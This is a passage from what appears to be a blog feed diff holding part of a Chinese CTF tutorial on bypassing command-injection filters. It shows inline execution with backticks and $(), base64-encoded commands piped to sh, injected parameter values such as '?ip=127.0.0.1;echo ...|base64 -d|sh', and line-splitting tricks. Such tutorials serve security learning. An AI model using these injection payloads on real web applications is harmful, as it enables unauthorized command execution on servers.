+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[]表示一个范围(正则),eg[abcd]匹配a,b,c,d&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#125;产生一个序列&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;8内敛执行绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8内敛执行绕过&#34;&gt;#&lt;/a&gt; 8. 内敛执行绕过&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;zxcv0221@kali:~/桌面$ echo &amp;quot;m0re`cat flag`&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;m0reyou are good!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;zxcv0221@kali:~/桌面$ echo &amp;quot;m0re $(cat flag)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;m0re you are good!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;zxcv0221@kali:~/桌面$ echo &amp;quot;m0re $(pwd)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;m0re /home/zxcv0221/桌面&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;9编码绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#9编码绕过&#34;&gt;#&lt;/a&gt; 9. 编码绕过&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;echo &amp;quot;Y2F0IGZsYWc=&amp;quot;|base64 -d&lt;/code&gt; &lt;br&gt;
+ 有的题目过滤了 bash, 可以用 sh&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?ip=127.0.0.1;echo &amp;quot;Y2F0IGZsYWc=&amp;quot;|base64 -d|bash无法使用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;可以用?ip=127.0.0.1;echo &amp;quot;Y2F0IGZsYWc=&amp;quot;|base64 -d|sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;ZmxhZw==|base64 -d&lt;/p&gt;
+&lt;h2 id=&#34;10绕过长度限制和的使用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#10绕过长度限制和的使用&#34;&gt;#&lt;/a&gt; 10. 绕过长度限制 &amp;gt; 和 &amp;gt;&amp;gt; 的使用&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;使用`&amp;gt;`命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建文件再存入&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;`&amp;gt;&amp;gt;`符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;11命令换行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11命令换行&#34;&gt;#&lt;/a&gt; 11. 命令换行&lt;/h2&gt;
+&lt;p&gt;ca&lt;br&gt;
+t&lt;br&gt;
+fl&lt;br&gt;
+ag&lt;/p&gt;
+&lt;h2 id=&#34;12借用已有字符串&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#12借用已有字符串&#34;&gt;#&lt;/a&gt; 12. 借用已有字符串&lt;/h2&gt;
+&lt;p&gt;substr 截取&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;expr substr ceshi01.php 3 5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo `expr substr $(awk NR==1 ceshi01.php) 1 1`&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://hq185187.github.io/2023/04/27/unserialize-labs/</guid>
             <title>Unserialize-labs</title>
